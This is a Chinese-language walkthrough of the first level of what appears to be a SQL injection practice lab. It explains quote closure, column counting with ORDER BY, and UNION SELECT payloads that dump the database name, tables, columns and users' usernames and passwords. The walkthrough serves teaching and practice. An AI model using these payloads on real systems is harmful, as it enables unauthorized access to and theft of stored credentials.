    第一关

    一.原理：

    一.首先看懂源码中的闭合符
    1.第一关：*$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”*;（源码）
    第一关中从 ‘$id’**看出了闭合符为‘ ‘，因此在第一关中我们使用‘**来完成闭合
    这两种闭合方式类似于C语言中 **{}**闭合。

    二.推测：

    类似C语言中，我们闭合完之后还有没有闭合的部分就会报错（关键），报错的内容一般为没有闭合的内容，通过这种报错我们可以得到我们想要的信息。

    二.解题:

    1.先判断类型(数字型or字符型)

    输入**?id=1后观察页面变化，再改为输入?id=2观察页面变化，再改为输入?id=2-1观察页面与上述哪一种类型相同。若与第一种?id=1**相同则为数字型（推测，因为满足数字的计算）.反之，则为字符型。

    2.判断闭合符:(重点：若为数字型则无闭合符)

    方法一：看源代码（具体看依据原理来判断）

    方法二：多次尝试

    一般的闭合测试为：

    a.?id=1’

    b.?id=1”

    c.?id=1’)

    d.?id=1”)

    但页面显示报错时则该种为闭合符。

    3.推测数字段：

    为什么：数字段类似于变量的个数，为下面使用union select的精确使用做铺垫，只有知道了准确的字段数才可以用union来进行操作获取你想要的东西因为union select …后面的字段必须与数据库的字段相对应。

    第一关中我们使用语句来测试：

    ?id=1’ order by 3 –+

    (解释这里的–+ 表示为注释符号，因为我们需要的报错内容不是全部所以注释掉我们要的内容以后的数据–+可以用#代替)

    我们如何判断字段数呢？

    当我们输入?id=1’ order by 3 –+的时候显示正常，但输入?id=1’ order by 4 –+时报错，因此我们判断数字段位3。

    4.爆库名：

    知道了位段后我们输入语句**?id=’ union select 1,2,database() –+**

    注释：

    a.这里我们把?id=x’ 的内容改变了，这里的x必须时该数据库不存在的id值。
    我觉得其实就是你前面已经找了SQL注入漏洞出现报错，那么你先要让其存在一个合理的报错形式 让后把后面的SQL语句也带进SQL里进行执行操作，从而获取信息
    b.这里的database()的应用，这里的database()加了()和不加是有区别的加了（）表示当前的数据库，不加为所有，因为我们要查看的为当前的数据库所以加().

    5.爆表名：

    构造语句：**?id=’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+**

    注释：

    group_concat（）：一次性获取数据库信息。

    6.爆字段名：

    构造与爆表名类似的语句:?id=’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()–+

    7.爆数据：

    构造语句：**?id=’union select 1,2,group_concat(username,0x3a,password) from users–+**
